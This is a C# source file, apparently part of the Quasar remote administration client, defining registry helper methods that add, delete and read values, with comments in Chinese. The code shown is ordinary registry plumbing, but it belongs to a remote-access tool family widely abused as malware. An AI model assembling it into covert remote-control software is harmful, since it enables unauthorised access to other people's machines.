﻿using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using Quasar.Client.Extensions;
using Quasar.Common.Models;
using Quasar.Common.Utilities;

namespace Quasar.Client.Helper
{
    public static class RegistryKeyHelper
    {
        private static string DEFAULT_VALUE = String.Empty;

        /// <summary>
        /// 向注册表键添加一个值。
        /// </summary>
        /// <param name="hive">表示远程计算机上顶级节点的可能值。</param>
        /// <param name="path">注册表键的路径。</param>
        /// <param name="name">值的名称。</param>
        /// <param name="value">值。</param>
        /// <param name="addQuotes">如果设置为True，则向值添加引号。</param>
        /// <returns>成功时返回True，否则返回False。</returns>
        public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;

                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                        value = "\"" + value + "\"";

                    key.SetValue(name, value);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// 打开一个只读注册表键。
        /// </summary>
        /// <param name="hive">表示远程计算机上顶级节点的可能值。</param>
        /// <param name="path">注册表键的路径。</param>
        /// <returns></returns>
        public static RegistryKey OpenReadonlySubKey(RegistryHive hive, string path)
        {
            try
            {
                return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, false);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// 从注册表键中删除指定的值。
        /// </summary>
        /// <param name="hive">表示远程计算机上顶级节点的可能值。</param>
        /// <param name="path">注册表键的路径。</param>
        /// <param name="name">要删除的值的名称。</param>
        /// <returns>成功时返回True，否则返回False。</returns>
        public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;
                    key.DeleteValue(name, true);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// 检查提供的值是否为默认值
        /// </summary>
        /// <param name="valueName">值的名称</param>
        /// <returns>如果是默认值则返回True，否则返回False</returns>
        public static bool IsDefaultValue(string valueName)
        {
            return String.IsNullOrEmpty(valueName);
        }

        /// <summary>
        /// 将默认值添加到值列表中并将其作为数组返回。
        /// 如果默认值已存在，则此函数只会将列表作为数组返回。
        /// </summary>
        /// <param name="values">应添加默认值的值列表</param>
        /// <returns>包含所有值（包括默认值）的数组</returns>
        public static RegValueData[] AddDefaultValue(List<RegValueData> values)
        {
            if(!values.Any(value => IsDefaultValue(value.Name)))
            {
                values.Add(GetDefaultValue());
            }
            return values.ToArray();
        }

        /// <summary>
        /// 获取默认注册表值
        /// </summary>
        /// <returns>包含默认注册表值的数组</returns>
        public static RegValueData[] GetDefaultValues()
        {
            return new[] {GetDefaultValue()};
        }

        public static RegValueData CreateRegValueData(string name, RegistryValueKind kind, object value = null)
        {
            var newRegValue = new RegValueData {Name = name, Kind = kind};

            if (value == null)
                newRegValue.Data = new byte[] { };
            else
            {
                switch (newRegValue.Kind)
                {
                    case RegistryValueKind.Binary:
                        newRegValue.Data = (byte[]) value;
                        break;
                    case RegistryValueKind.MultiString:
                        newRegValue.Data = ByteConverter.GetBytes((string[]) value);
                        break;
                    case RegistryValueKind.DWord:
                        newRegValue.Data = ByteConverter.GetBytes((uint) (int) value);
                        break;
                    case RegistryValueKind.QWord:
                        newRegValue.Data = ByteConverter.GetBytes((ulong) (long) value);
                        break;
                    case RegistryValueKind.String:
                    case RegistryValueKind.ExpandString:
                        newRegValue.Data = ByteConverter.GetBytes((string) value);
                        break;
                }
            }

            return newRegValue;
        }

        private static RegValueData GetDefaultValue()
        {
            return CreateRegValueData(DEFAULT_VALUE, RegistryValueKind.String);
        }
    }
}
